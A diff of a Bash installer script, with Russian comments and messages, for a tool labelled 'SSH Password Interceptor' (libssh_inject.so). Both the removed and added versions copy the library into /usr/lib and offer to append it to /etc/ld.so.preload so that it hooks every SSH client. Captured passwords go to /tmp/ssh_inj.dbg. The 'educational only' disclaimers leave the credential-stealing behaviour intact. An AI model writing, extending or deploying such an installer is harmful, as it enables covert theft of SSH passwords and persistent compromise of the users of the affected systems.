@@ -1,105 +1,96 @@
 #!/bin/bash
 
-# Установщик для libssh_inject.so
-# Этот скрипт устанавливает библиотеку в систему и настраивает её автоматическую загрузку
+# SSH Password Interceptor - Установщик
+# Версия 1.1.0
 
-# Проверка root прав
-if [ "$EUID" -ne 0 ]; then
-  echo "Для установки библиотеки требуются права администратора."
-  echo "Запустите скрипт с sudo: sudo ./installer.sh"
-  exit 1
+echo "====================================="
+echo "   SSH Password Interceptor v1.1.0"
+echo "           Установка"
+echo "====================================="
+echo ""
+
+# Проверка привилегий root
+if [ "$(id -u)" != "0" ]; then
+    echo "Ошибка: для установки требуются привилегии администратора."
+    echo "Запустите скрипт с sudo: sudo ./installer.sh"
+    exit 1
 fi
 
-# Функция для очистки и выхода при ошибке
-cleanup_and_exit() {
-  echo "Произошла ошибка. Установка прервана."
-  exit 1
-}
-
-# Проверка наличия исходных файлов
-if [ ! -f state.hpp ] || [ ! -f ssh_inject.cpp ]; then
-  echo "Не найдены исходные файлы state.hpp и/или ssh_inject.cpp."
-  echo "Убедитесь, что вы запускаете скрипт из директории с исходными файлами."
-  exit 1
+# Проверка операционной системы
+OS=$(uname -s)
+if [ "$OS" != "Linux" ]; then
+    echo "Ошибка: этот установщик поддерживается только для Linux."
+    exit 1
 fi
 
-# Создание временной директории для сборки
-echo "Создание временной директории для сборки..."
-BUILD_DIR=$(mktemp -d)
-cp state.hpp "$BUILD_DIR/"
-cp ssh_inject.cpp "$BUILD_DIR/"
-cd "$BUILD_DIR" || cleanup_and_exit
+# Предупреждение об использовании
+echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
+echo "Использование этого инструмента для несанкционированного доступа к системам"
+echo "является незаконным и неэтичным."
+echo ""
+read -p "Нажмите Enter, чтобы продолжить..."
+echo ""
 
-# Компиляция библиотеки
-echo "Компиляция libssh_inject.so..."
-mkdir -p src/ssh_inject
-cp state.hpp src/ssh_inject/
-cp ssh_inject.cpp src/ssh_inject/
-g++ -shared -fPIC -o libssh_inject.so src/ssh_inject/ssh_inject.cpp -ldl
-
-if [ $? -ne 0 ]; then
-  echo "Ошибка компиляции! Проверьте наличие компилятора g++ и библиотеки libdl."
-  cleanup_and_exit
+# Проверка наличия скомпилированной библиотеки
+LIB_NAME="libssh_inject.so"
+if [ ! -f "$LIB_NAME" ]; then
+    echo "Ошибка: библиотека $LIB_NAME не найдена в текущей директории."
+    echo "Убедитесь, что библиотека была успешно скомпилирована."
+    exit 1
 fi
 
-# Проверка компиляции
-if [ ! -f libssh_inject.so ]; then
-  echo "Ошибка: файл libssh_inject.so не найден после компиляции."
-  cleanup_and_exit
+# Установка библиотеки
+echo "Установка библиотеки $LIB_NAME в /usr/lib..."
+cp "$LIB_NAME" /usr/lib/
+chmod 755 "/usr/lib/$LIB_NAME"
+
+# Проверка успешной установки
+if [ ! -f "/usr/lib/$LIB_NAME" ]; then
+    echo "Ошибка: не удалось установить библиотеку в /usr/lib/$LIB_NAME."
+    exit 1
 fi
 
-echo "Библиотека успешно скомпилирована."
+echo "Библиотека успешно установлена в /usr/lib/$LIB_NAME."
+echo ""
 
-# Копирование библиотеки в системную директорию
-echo "Установка библиотеки в систему..."
-INSTALL_DIR="/usr/lib"
-cp libssh_inject.so "$INSTALL_DIR/"
-chmod 755 "$INSTALL_DIR/libssh_inject.so"
+# Настройка автоматической загрузки
+echo "Хотите настроить систему для автоматической загрузки библиотеки?"
+echo "Это позволит перехватывать пароли от всех SSH-клиентов."
+read -p "Настроить автозагрузку? (y/n): " configure_autoload
 
-if [ ! -f "$INSTALL_DIR/libssh_inject.so" ]; then
-  echo "Ошибка: не удалось скопировать библиотеку в $INSTALL_DIR."
-  cleanup_and_exit
-fi
-
-# Создание лог-файла
-touch /tmp/ssh_inj.dbg
-chmod 666 /tmp/ssh_inj.dbg
-
-# Настройка автозагрузки через ld.so.preload
-echo "Настройка автозагрузки библиотеки..."
-echo -n "Вы хотите настроить автоматическую загрузку библиотеки через /etc/ld.so.preload? [y/N]: "
-read auto_load
-
-if [[ "$auto_load" =~ ^[Yy]$ ]]; then
-  # Создаем резервную копию текущего ld.so.preload
-  if [ -f /etc/ld.so.preload ]; then
-    cp /etc/ld.so.preload /etc/ld.so.preload.bak
-    echo "Создана резервная копия /etc/ld.so.preload.bak"
-  fi
-  
-  # Проверяем, есть ли уже наша библиотека в ld.so.preload
-  if [ -f /etc/ld.so.preload ] && grep -q "$INSTALL_DIR/libssh_inject.so" /etc/ld.so.preload; then
-    echo "Библиотека уже прописана в /etc/ld.so.preload"
-  else
-    echo "$INSTALL_DIR/libssh_inject.so" >> /etc/ld.so.preload
-    echo "Библиотека добавлена в /etc/ld.so.preload"
-  fi
-  
-  echo ""
-  echo "ВНИМАНИЕ: Библиотека будет автоматически загружаться для всех процессов SSH."
-  echo "Если возникнут проблемы, удалите библиотеку из /etc/ld.so.preload."
+if [ "$configure_autoload" = "y" ] || [ "$configure_autoload" = "Y" ]; then
+    # Проверка существования файла /etc/ld.so.preload
+    if [ -f "/etc/ld.so.preload" ]; then
+        echo "Файл /etc/ld.so.preload уже существует."
+        
+        # Создаем резервную копию
+        cp /etc/ld.so.preload /etc/ld.so.preload.installer.bak
+        echo "Создана резервная копия: /etc/ld.so.preload.installer.bak"
+        
+        # Проверяем, содержит ли файл уже ссылку на нашу библиотеку
+        if grep -q "/usr/lib/$LIB_NAME" /etc/ld.so.preload; then
+            echo "Библиотека уже настроена для автозагрузки."
+        else
+            # Добавляем нашу библиотеку в файл
+            echo "/usr/lib/$LIB_NAME" >> /etc/ld.so.preload
+            echo "Библиотека добавлена в /etc/ld.so.preload для автозагрузки."
+        fi
+    else
+        # Создаем файл и добавляем нашу библиотеку
+        echo "/usr/lib/$LIB_NAME" > /etc/ld.so.preload
+        echo "Создан файл /etc/ld.so.preload и библиотека настроена для автозагрузки."
+    fi
+    
+    echo "Настройка автозагрузки завершена."
 else
-  echo ""
-  echo "Вы выбрали ручную загрузку библиотеки."
-  echo "Для использования выполните команду:"
-  echo "LD_PRELOAD=$INSTALL_DIR/libssh_inject.so ssh user@server"
+    echo "Автозагрузка не настроена."
+    echo "Для ручной загрузки библиотеки используйте:"
+    echo "export LD_PRELOAD=/usr/lib/$LIB_NAME"
 fi
-
-# Очистка
-echo "Очистка временных файлов..."
-cd - > /dev/null || cleanup_and_exit
-rm -rf "$BUILD_DIR"
 
 echo ""
 echo "Установка завершена успешно!"
-echo "Пароли будут сохраняться в файл: /tmp/ssh_inj.dbg" 
+echo "Перехваченные пароли будут записаны в /tmp/ssh_inj.dbg"
+echo ""
+echo "ВАЖНО: Используйте этот инструмент только в образовательных целях."
+echo "Несанкционированный доступ к чужим системам является незаконным." 
